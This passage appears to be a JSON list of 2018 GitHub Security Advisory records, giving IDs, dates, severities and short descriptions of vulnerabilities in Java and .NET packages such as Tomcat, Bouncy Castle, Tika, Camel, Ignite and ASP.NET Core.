    "description": "If an async request was completed by the application at the same time as the container triggered the async timeout, a race condition existed that could result in a user seeing a response intended for a different user. An additional issue was present in the NIO and NIO2 connectors that did not correctly track the closure of the connection when an async request was completed by the application and timed out by the container at the same time. This could also result in a user seeing a response intended for another user. Versions Affected: Apache Tomcat 9.0.0.M9 to 9.0.9 and 8.5.5 to 8.5.31.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-46j3-r4pj-4835",
    "publishedAt": "2018-10-17T16:32:43Z",
    "description": "The host name verification when using TLS with the WebSocket client was missing. It is now enabled by default. Versions Affected: Apache Tomcat 9.0.0.M1 to 9.0.9, 8.5.0 to 8.5.31, 8.0.0.RC1 to 8.0.52, and 7.0.35 to 7.0.88.",
    "summary": "Low severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-r4x2-3cq5-hqvp",
    "publishedAt": "2018-10-17T16:32:32Z",
    "description": "The defaults settings for the CORS filter provided in Apache Tomcat 9.0.0.M1 to 9.0.8, 8.5.0 to 8.5.31, 8.0.0.RC1 to 8.0.52, 7.0.41 to 7.0.88 are insecure and enable 'supportsCredentials' for all origins. It is expected that users of the CORS filter will have configured it appropriately for their environment rather than using it in the default configuration. Therefore, it is expected that most users will not be impacted by this issue.",
    "summary": "High severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-m59c-jpc8-m2x4",
    "publishedAt": "2018-10-17T16:32:18Z",
    "description": "An improper handing of overflow in the UTF-8 decoder with supplementary characters can lead to an infinite loop in the decoder causing a Denial of Service. Versions Affected: Apache Tomcat 9.0.0.M9 to 9.0.7, 8.5.0 to 8.5.30, 8.0.0.RC1 to 8.0.51, and 7.0.28 to 7.0.86.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-jx6h-3fjx-cgv5",
    "publishedAt": "2018-10-17T16:31:48Z",
    "description": "Security constraints defined by annotations of Servlets in Apache Tomcat 9.0.0.M1 to 9.0.4, 8.5.0 to 8.5.27, 8.0.0.RC1 to 8.0.49 and 7.0.0 to 7.0.84 were only applied once a Servlet had been loaded. Because security constraints defined in this way apply to the URL pattern and any URLs below that point, it was possible - depending on the order Servlets were loaded - for some security constraints not to be applied. This could have exposed resources to users who were not authorised to access them.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-6rxj-58jh-436r",
    "publishedAt": "2018-10-17T16:31:17Z",
    "description": "The URL pattern of \"\" (the empty string) which exactly maps to the context root was not correctly handled in Apache Tomcat 9.0.0.M1 to 9.0.4, 8.5.0 to 8.5.27, 8.0.0.RC1 to 8.0.49 and 7.0.0 to 7.0.84 when used as part of a security constraint definition. This caused the constraint to be ignored. It was, therefore, possible for unauthorised users to gain access to web application resources that should have been protected. Only security constraints with a URL pattern of the empty string were affected.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-5q99-f34m-67gc",
    "publishedAt": "2018-10-17T16:31:02Z",
    "description": "When the default servlet in Apache Tomcat versions 9.0.0.M1 to 9.0.11, 8.5.0 to 8.5.33 and 7.0.23 to 7.0.90 returned a redirect to a directory (e.g. redirecting to '/foo/' when the user requested '/foo') a specially crafted URL could be used to cause the redirect to be generated to any URI of the attackers choice.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-pjfr-qf3p-3q25",
    "publishedAt": "2018-10-17T16:30:31Z",
    "description": "When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-4mv7-cq75-3qjm",
    "publishedAt": "2018-10-17T16:27:50Z",
    "description": "The Bouncy Castle Java library before 1.51 does not validate a point is withing the elliptic curve, which makes it easier for remote attackers to obtain private keys via a series of crafted elliptic curve Diffie Hellman (ECDH) key exchanges, aka an \"invalid curve attack.\"",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-w285-wf9q-5w69",
    "publishedAt": "2018-10-17T16:27:38Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier the ECIES implementation allowed the use of ECB mode. This mode is regarded as unsafe and support for it has been removed from the provider.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-fjqm-246c-mwqg",
    "publishedAt": "2018-10-17T16:27:28Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier the other party DH public key is not fully validated. This can cause issues as invalid keys can be used to reveal details about the other party's private key where static Diffie-Hellman is in use. As of release 1.56 the key parameters are checked on agreement calculation.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-rrvx-pwf8-p59p",
    "publishedAt": "2018-10-17T16:24:22Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier the DSA key pair generator generates a weak private key if used with default values. If the JCA key pair generator is not explicitly initialised with DSA parameters, 1.55 and earlier generates a private value assuming a 1024 bit key size. In earlier releases this can be dealt with by explicitly passing parameters to the key pair generator.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-qcj7-g2j5-g7r3",
    "publishedAt": "2018-10-17T16:24:12Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier ECDSA does not fully validate ASN.1 encoding of signature on verification. It is possible to inject extra elements in the sequence making up the signature and still have it validate, which in some cases may allow the introduction of 'invisible' data into a signed structure.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-r9ch-m4fh-fc7q",
    "publishedAt": "2018-10-17T16:24:00Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier DSA signature generation is vulnerable to timing attack. Where timings can be closely observed for the generation of signatures, the lack of blinding in 1.55, or earlier, may allow an attacker to gain information about the signature's k value and ultimately the private value as well.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-r97x-3g8f-gx3m",
    "publishedAt": "2018-10-17T16:23:50Z",
    "description": "In the Bouncy Castle JCE Provider versions 1.51 to 1.55, a carry propagation bug was introduced in the implementation of squaring for several raw math classes have been fixed (org.bouncycastle.math.raw.Nat???). These classes are used by our custom elliptic curve implementations (org.bouncycastle.math.ec.custom.**), so there was the possibility of rare (in general usage) spurious calculations for elliptic curve scalar multiplications. Such errors would have been detected with high probability by the output validation for our scalar multipliers.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-c8xf-m4ff-jcxj",
    "publishedAt": "2018-10-17T16:23:38Z",
    "description": "In the Bouncy Castle JCE Provider version 1.55 and earlier the primary engine class used for AES was AESFastEngine. Due to the highly table driven approach used in the algorithm it turns out that if the data channel on the CPU can be monitored the lookup table accesses are sufficient to leak information on the AES key being used. There was also a leak in AESEngine although it was substantially less. AESEngine has been modified to remove any signs of leakage (testing carried out on Intel X86-64) and is now the primary AES class for the BC JCE provider from 1.56. Use of AESFastEngine is now only recommended where otherwise deemed appropriate.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-4vhj-98r6-424h",
    "publishedAt": "2018-10-17T16:23:26Z",
    "description": "In Bouncy Castle JCE Provider version 1.55 and earlier the DSA does not fully validate ASN.1 encoding of signature on verification. It is possible to inject extra elements in the sequence making up the signature and still have it validate, which in some cases may allow the introduction of 'invisible' data into a signed structure.",
    "summary": "Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-4446-656p-f54g",
    "publishedAt": "2018-10-17T16:23:12Z",
    "description": "Legion of the Bouncy Castle Legion of the Bouncy Castle Java Cryptography APIs version prior to version 1.60 contains a CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') vulnerability in XMSS/XMSS^MT private key deserialization that can result in Deserializing an XMSS/XMSS^MT private key can result in the execution of unexpected code.. This attack appear to be exploitable via A handcrafted private key can include references to unexpected classes which will be picked up from the class path for the executing application.. This vulnerability appears to have been fixed in 1.60 and later.",
    "summary": "High severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15"
  },
  {
    "ghsaId": "GHSA-h39x-m55c-v55h",
    "publishedAt": "2018-10-17T16:20:45Z",
    "description": "In version from 3.0.0 to 3.5.3 of Eclipse Vert.x, the StaticHandler uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\\' (forward slashes) sequences that can resolve to a location that is outside of that directory when running on Windows Operating Systems.",
    "summary": "Low severity vulnerability that affects io.vertx:vertx-web"
  },
  {
    "ghsaId": "GHSA-qh3m-qw6v-qvhg",
    "publishedAt": "2018-10-17T16:20:32Z",
    "description": "In version from 3.5.Beta1 to 3.5.3 of Eclipse Vert.x, the OpenAPI XML type validator creates XML parsers without taking appropriate defense against XML attacks. This mechanism is exclusively when the developer uses the Eclipse Vert.x OpenAPI XML type validator to validate a provided schema.",
    "summary": "Moderate severity vulnerability that affects io.vertx:vertx-core"
  },
  {
    "ghsaId": "GHSA-45xm-v8gq-7jqx",
    "publishedAt": "2018-10-17T16:19:59Z",
    "description": "In version from 3.0.0 to 3.5.3 of Eclipse Vert.x, the WebSocket HTTP upgrade implementation buffers the full http request before doing the handshake, holding the entire request body in memory. There should be a reasonnable limit (8192 bytes) above which the WebSocket gets an HTTP response with the 413 status code and the connection gets closed.",
    "summary": "Low severity vulnerability that affects io.vertx:vertx-core"
  },
  {
    "ghsaId": "GHSA-rvgg-f8qm-6h7j",
    "publishedAt": "2018-10-17T16:19:43Z",
    "description": "In version from 3.0.0 to 3.5.2 of Eclipse Vert.x, the CSRFHandler do not assert that the XSRF Cookie matches the returned XSRF header/form parameter. This allows replay attacks with previously issued tokens which are not expired yet.",
    "summary": "High severity vulnerability that affects io.vertx:vertx-web"
  },
  {
    "ghsaId": "GHSA-5mf7-26mw-3rqr",
    "publishedAt": "2018-10-17T15:50:45Z",
    "description": "A carefully crafted (or fuzzed) file can trigger an infinite loop in Apache Tika's BPGParser in versions of Apache Tika before 1.18.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-j53j-gmr9-h8g3",
    "publishedAt": "2018-10-17T15:50:31Z",
    "description": "In Apache Tika 1.2 to 1.18, a carefully crafted file can trigger an infinite loop in the IptcAnpaParser.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-w6g3-v46q-5p28",
    "publishedAt": "2018-10-17T15:49:58Z",
    "description": "In Apache Tika 0.9 to 1.18, in a rare edge case where a user does not specify an extract directory on the commandline (--extract-dir=) and the input file has an embedded file with an absolute path, such as \"C:/evil.bat\", tika-app would overwrite that file.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-6jq2-789q-fff2",
    "publishedAt": "2018-10-17T15:49:36Z",
    "description": "In Apache Tika 0.1 to 1.18, the XML parsers were not configured to limit entity expansion. They were therefore vulnerable to an entity expansion vulnerability which can lead to a denial of service attack.",
    "summary": "High severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-j8g6-2wh7-6439",
    "publishedAt": "2018-10-17T15:44:36Z",
    "description": "Apache Tika before 1.14 allows Java code execution for serialized objects embedded in MATLAB files. The issue exists because Tika invokes JMatIO to do native deserialization.",
    "summary": "High severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-4xr4-4c65-hj7f",
    "publishedAt": "2018-10-17T15:44:22Z",
    "description": "Apache Tika before 1.13 does not properly initialize the XML parser or choose handlers, which might allow remote attackers to conduct XML External Entity (XXE) attacks via vectors involving (1) spreadsheets in OOXML files and (2) XMP metadata in PDF and other file formats, a related issue to CVE-2016-2175.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-ccjp-w723-2jf2",
    "publishedAt": "2018-10-17T15:44:10Z",
    "description": "Apache Tika server (aka tika-server) in Apache Tika 1.9 might allow remote attackers to read arbitrary files via the HTTP fileUrl header.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-p699-3wgc-7h72",
    "publishedAt": "2018-10-17T15:43:59Z",
    "description": "A carefully crafted (or fuzzed) file can trigger an infinite loop in Apache Tika's ChmParser in versions of Apache Tika before 1.18.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-9r24-gp44-h3pm",
    "publishedAt": "2018-10-17T15:43:43Z",
    "description": "From Apache Tika versions 1.7 to 1.17, clients could send carefully crafted headers to tika-server that could be used to inject commands into the command line of the server running tika-server. This vulnerability only affects those running tika-server on a server that is open to untrusted clients. The mitigation is to upgrade to Tika 1.18.",
    "summary": "High severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-h8q5-g2cj-qr5h",
    "publishedAt": "2018-10-17T15:43:25Z",
    "description": "In Apache Tika 1.19 (CVE-2018-11761), we added an entity expansion limit for XML parsing. However, Tika reuses SAXParsers and calls reset() after each parse, which, for Xerces2 parsers, as per the documentation, removes the user-specified SecurityManager and thus removes entity expansion limits after the first parse. Apache Tika versions from 0.1 to 1.19 are therefore still vulnerable to entity expansions which can lead to a denial of service attack. Users should upgrade to 1.19.1 or later.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-fmj5-wv96-r2ch",
    "publishedAt": "2018-10-17T00:05:29Z",
    "description": "http/conn/ssl/SSLConnectionSocketFactory.java in Apache HttpComponents HttpClient before 4.3.6 ignores the http.socket.timeout configuration setting during an SSL handshake, which allows remote attackers to cause a denial of service (HTTPS call hang) via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects org.apache.httpcomponents:httpclient"
  },
  {
    "ghsaId": "GHSA-2x83-r56g-cv47",
    "publishedAt": "2018-10-17T00:05:15Z",
    "description": "http/conn/ssl/AbstractVerifier.java in Apache Commons HttpClient before 4.2.3 does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a certificate with a subject that specifies a common name in a field that is not the CN field. NOTE: this issue exists because of an incomplete fix for CVE-2012-5783.",
    "summary": "High severity vulnerability that affects org.apache.httpcomponents:httpclient"
  },
  {
    "ghsaId": "GHSA-cfh5-3ghh-wfjx",
    "publishedAt": "2018-10-17T00:05:06Z",
    "description": "org.apache.http.conn.ssl.AbstractVerifier in Apache HttpComponents HttpClient before 4.3.5 and HttpAsyncClient before 4.0.2 does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a \"CN=\" string in a field in the distinguished name (DN) of a certificate, as demonstrated by the \"foo,CN=www.apache.org\" string in the O field.",
    "summary": "Moderate severity vulnerability that affects org.apache.httpcomponents:httpclient"
  },
  {
    "ghsaId": "GHSA-73cq-fhp3-8rpw",
    "publishedAt": "2018-10-17T00:04:53Z",
    "description": "Restlet Framework 2.1.x before 2.1.7 and 2.x.x before 2.2 RC1, when using XMLRepresentation or XML serializers, allows attackers to cause a denial of service via an XML Entity Expansion (XEE) attack.",
    "summary": "Moderate severity vulnerability that affects org.restlet.jse:org.restlet"
  },
  {
    "ghsaId": "GHSA-2mp8-qvqm-3xwq",
    "publishedAt": "2018-10-17T00:04:31Z",
    "description": "Restlet Framework before 2.3.11, when using SimpleXMLProvider, allows remote attackers to access arbitrary files via an XXE attack in a REST API HTTP request. This affects use of the Jax-rs extension.",
    "summary": "Moderate severity vulnerability that affects org.restlet.jse:org.restlet"
  },
  {
    "ghsaId": "GHSA-cvj4-g3gx-8vqq",
    "publishedAt": "2018-10-17T00:04:18Z",
    "description": "Restlet Framework before 2.3.12 allows remote attackers to access arbitrary files via a crafted REST API HTTP request that conducts an XXE attack, because only general external entities (not parameter external entities) are properly considered. This is related to XmlRepresentation, DOMRepresentation, SaxRepresentation, and JacksonRepresentation.",
    "summary": "Moderate severity vulnerability that affects org.restlet.jse:org.restlet"
  },
  {
    "ghsaId": "GHSA-5xqr-grq4-qwgx",
    "publishedAt": "2018-10-17T00:04:05Z",
    "description": "Archive.java in Junrar before 1.0.1, as used in Apache Tika and other products, is affected by a denial of service vulnerability due to an infinite loop when handling corrupt RAR files.",
    "summary": "Moderate severity vulnerability that affects com.github.junrar:junrar"
  },
  {
    "ghsaId": "GHSA-h6rp-8v4j-hwph",
    "publishedAt": "2018-10-16T23:13:49Z",
    "description": "The XSLT component in Apache Camel 2.11.x before 2.11.4, 2.12.x before 2.12.3, and possibly earlier versions allows remote attackers to execute arbitrary Java methods via a crafted message.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-2fw5-rvf2-jq56",
    "publishedAt": "2018-10-16T23:13:26Z",
    "description": "The XSLT component in Apache Camel before 2.11.4 and 2.12.x before 2.12.3 allows remote attackers to read arbitrary files and possibly have other unspecified impact via an XML document containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-vq9j-jh62-5hmp",
    "publishedAt": "2018-10-16T23:13:11Z",
    "description": "Apache Camel's Validation Component is vulnerable against SSRF via remote DTDs and XXE.",
    "summary": "Moderate severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-vvjc-q5vr-52q6",
    "publishedAt": "2018-10-16T23:13:00Z",
    "description": "Apache Camel's Jackson and JacksonXML unmarshalling operation are vulnerable to Remote Code Execution attacks.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-jackson"
  },
  {
    "ghsaId": "GHSA-26v6-w6fw-rh94",
    "publishedAt": "2018-10-16T23:12:20Z",
    "description": "Apache Camel 2.6.x through 2.14.x, 2.15.x before 2.15.5, and 2.16.x before 2.16.1, when using (1) camel-jetty or (2) camel-servlet as a consumer in Camel routes, allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.",
    "summary": "Moderate severity vulnerability that affects org.apache.camel:camel-jetty and org.apache.camel:camel-servlet"
  },
  {
    "ghsaId": "GHSA-gv5f-cjw9-5vxg",
    "publishedAt": "2018-10-16T23:10:23Z",
    "description": "The camel-xstream component in Apache Camel before 2.15.5 and 2.16.x before 2.16.1 allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-xstream"
  },
  {
    "ghsaId": "GHSA-mhx2-r3jx-g94c",
    "publishedAt": "2018-10-16T23:09:15Z",
    "description": "Multiple XML external entity (XXE) vulnerabilities in builder/xml/XPathBuilder.java in Apache Camel before 2.13.4 and 2.14.x before 2.14.2 allow remote attackers to read arbitrary files via an external entity in an invalid XML (1) String or (2) GenericFile object in an XPath query.",
    "summary": "Moderate severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-3hrc-f439-727g",
    "publishedAt": "2018-10-16T23:08:43Z",
    "description": "XML external entity (XXE) vulnerability in the XML converter setup in converter/jaxp/XmlConverter.java in Apache Camel before 2.13.4 and 2.14.x before 2.14.2 allows remote attackers to read arbitrary files via an external entity in an SAXSource.",
    "summary": "Moderate severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-jv74-f9pj-xp3f",
    "publishedAt": "2018-10-16T23:07:57Z",
    "description": "Apache Camel's Mail 2.20.0 through 2.20.3, 2.21.0 through 2.21.1 and 2.22.0 is vulnerable to path traversal.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-mail"
  },
  {
    "ghsaId": "GHSA-8vfm-4388-6rpc",
    "publishedAt": "2018-10-16T23:06:25Z",
    "description": "Apache Camel 2.20.0 to 2.20.3 and 2.21.0 Core is vulnerable to XXE in XSD validation processor.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-vf4q-8mr7-5c5c",
    "publishedAt": "2018-10-16T23:05:58Z",
    "description": "The camel-castor component in Apache Camel 2.x before 2.19.4 and 2.20.x before 2.20.1 is vulnerable to Java object de-serialisation vulnerability. De-serializing untrusted data can lead to security flaws.",
    "summary": "High severity vulnerability that affects org.apache.camel:camel-castor"
  },
  {
    "ghsaId": "GHSA-qcjv-wfcg-mmpr",
    "publishedAt": "2018-10-16T20:53:54Z",
    "description": "Apache Ignite 2.5 and earlier serialization mechanism does not have a list of classes allowed for serialization/deserialization, which makes it possible to run arbitrary code when 3-rd party vulnerable classes are present in Ignite classpath. The vulnerability can be exploited if the one sends a specially prepared form of a serialized object to GridClientJdkMarshaller deserialization endpoint.",
    "summary": "Critical severity vulnerability that affects org.apache.ignite:ignite-core"
  },
  {
    "ghsaId": "GHSA-chp4-rv79-68j3",
    "publishedAt": "2018-10-16T20:53:44Z",
    "description": "In Apache Ignite 2.3 or earlier, the serialization mechanism does not have a list of classes allowed for serialization/deserialization, which makes it possible to run arbitrary code when 3-rd party vulnerable classes are present in Ignite classpath. The vulnerability can be exploited if the one sends a specially prepared form of a serialized object to one of the deserialization endpoints of some Ignite components - discovery SPI, Ignite persistence, Memcached endpoint, socket steamer.",
    "summary": "High severity vulnerability that affects org.apache.ignite:ignite-core"
  },
  {
    "ghsaId": "GHSA-8qfc-cvjp-mgpq",
    "publishedAt": "2018-10-16T20:53:31Z",
    "description": "Apache Ignite before 1.9 allows man-in-the-middle attackers to read arbitrary files via XXE in modified update-notifier documents.",
    "summary": "Moderate severity vulnerability that affects org.apache.ignite:ignite-core"
  },
  {
    "ghsaId": "GHSA-8p83-68cw-943f",
    "publishedAt": "2018-10-16T20:53:20Z",
    "description": "Apache Ignite 1.0.0-RC3 to 2.0 uses an update notifier component to update the users about new project releases that include additional functionality, bug fixes and performance improvements. To do that the component communicates to an external PHP server (http://ignite.run) where it needs to send some system properties like Apache Ignite or Java version. Some of the properties might contain user sensitive information.",
    "summary": "Moderate severity vulnerability that affects org.apache.ignite:ignite-core"
  },
  {
    "ghsaId": "GHSA-96jq-75wh-2658",
    "publishedAt": "2018-10-16T20:51:15Z",
    "description": "Apache Axis 1.x up to and including 1.4 is vulnerable to a cross-site scripting (XSS) attack in the default servlet/services.\r\n\r\n\r\njava ",
    "summary": "Moderate severity vulnerability that affects org.apache.axis:axis"
  },
  {
    "ghsaId": "GHSA-r53v-vm87-f72c",
    "publishedAt": "2018-10-16T20:50:58Z",
    "description": "The getCN function in Apache Axis 1.4 and earlier does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a certificate with a subject that specifies a common name in a field that is not the CN field.  NOTE: this issue exists because of an incomplete fix for CVE-2012-5784.",
    "summary": "Moderate severity vulnerability that affects org.apache.axis:axis"
  },
  {
    "ghsaId": "GHSA-cgpw-2gph-2r9g",
    "publishedAt": "2018-10-16T19:59:59Z",
    "description": "Microsoft is aware of a denial of service vulnerability in ASP.NET Core when a malformed request is terminated. An attacker who successfully exploited this vulnerability could cause a denial of service attack.\r\n\r\nThe update addresses the vulnerability by correcting how ASP.NET Core handles such requests.\r\n",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.All, Microsoft.AspNetCore.App, and Microsoft.AspNetCore.Server.Kestrel.Core"
  },
  {
    "ghsaId": "GHSA-3m2r-q8x3-xmf7",
    "publishedAt": "2018-10-16T19:59:48Z",
    "description": "Microsoft made an internal discovery of a security vulnerability in version 2.x of ASP.NET Core where\r\na specially crafted request can cause excess resource consumption in Kestrel.\r\n",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.All, Microsoft.AspNetCore.Server.Kestrel.Core, Microsoft.AspNetCore.Server.Kestrel.Transport.Abstractions, and Microsoft.AspNetCore.Server.Kestrel.Transport.Libuv"
  },
  {
    "ghsaId": "GHSA-jc8g-xhw5-6x46",
    "publishedAt": "2018-10-16T19:59:05Z",
    "description": "Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka \".NET Security Feature Bypass Vulnerability.\"",
    "summary": "Moderate severity vulnerability that affects Microsoft.NETCore.UniversalWindowsPlatform and Microsoft.NETCore.UniversalWindowsPlatform "
  },
  {
    "ghsaId": "GHSA-ch6p-4jcm-h8vh",
    "publishedAt": "2018-10-16T19:58:52Z",
    "description": "Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka \".NET Security Feature Bypass Vulnerability.\"",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core"
  },
  {
    "ghsaId": "GHSA-gr4c-5rq6-cgh3",
    "publishedAt": "2018-10-16T19:58:42Z",
    "description": "An issue was discovered in OPC UA .NET Standard Stack and Sample Code before GitHub commit 2018-04-12, and OPC UA .NET Legacy Stack and Sample Code before GitHub commit 2018-03-13. A vulnerability in OPC UA applications can allow a remote attacker to determine a Server's private key by sending carefully constructed bad UserIdentityTokens as part of an oracle attack.",
    "summary": "Low severity vulnerability that affects OPCFoundation.NetStandard.Opc.Ua"
  },
  {
    "ghsaId": "GHSA-mv2r-q4g5-j8q5",
    "publishedAt": "2018-10-16T19:58:31Z",
    "description": "A denial of service vulnerability exists when OData Library improperly handles web requests, aka \"OData Denial of Service Vulnerability.\" This affects Microsoft.Data.OData.",
    "summary": "Moderate severity vulnerability that affects Microsoft.Data.OData"
  },
  {
    "ghsaId": "GHSA-6xh7-4v2w-36q6",
    "publishedAt": "2018-10-16T19:58:05Z",
    "description": "A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc"
  },
  {
    "ghsaId": "GHSA-j8f4-2w4p-mhjc",
    "publishedAt": "2018-10-16T19:57:48Z",
    "description": "A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc"
  },
  {
    "ghsaId": "GHSA-qhqf-ghgh-x2m4",
    "publishedAt": "2018-10-16T19:57:38Z",
    "description": "An elevation of privilege vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.",
    "summary": "High severity vulnerability that affects Microsoft.AspNetCore.Mvc"
  },
  {
    "ghsaId": "GHSA-365p-96qv-xr7g",
    "publishedAt": "2018-10-16T19:56:59Z",
    "description": "ASP.NET Core 1.0. 1.1, and 2.0 allow an elevation of privilege vulnerability due to how web applications that are created from templates validate web requests, aka \"ASP.NET Core Elevation Of Privilege Vulnerability\".",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.HttpOverrides and Microsoft.AspNetCore.Server.Kestrel.Core"
  },
  {
    "ghsaId": "GHSA-vhvh-528q-ff3p",
    "publishedAt": "2018-10-16T19:56:50Z",
    "description": "A Security Feature Bypass vulnerability exists in ASP.NET when the number of incorrect login attempts is not validated, aka \"ASP.NET Security Feature Bypass Vulnerability.\" This affects ASP.NET, ASP.NET Core 1.1, ASP.NET Core 1.0, ASP.NET Core 2.0, ASP.NET MVC 5.2.",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.Identity"
  },
  {
    "ghsaId": "GHSA-j378-6mmw-hqfr",
    "publishedAt": "2018-10-16T19:56:38Z",
    "description": "A denial of service vulnerability exists when System.IO.Pipelines improperly handles requests, aka \"System.IO.Pipelines Denial of Service.\" This affects .NET Core 2.1, System.IO.Pipelines, ASP.NET Core 2.1.",
    "summary": "Moderate severity vulnerability that affects Microsoft.AspNetCore.All, Microsoft.AspNetCore.App, and System.IO.Pipelines"
  },
  {
    "ghsaId": "GHSA-35hc-x2cw-2j4v",
    "publishedAt": "2018-10-16T19:54:06Z",
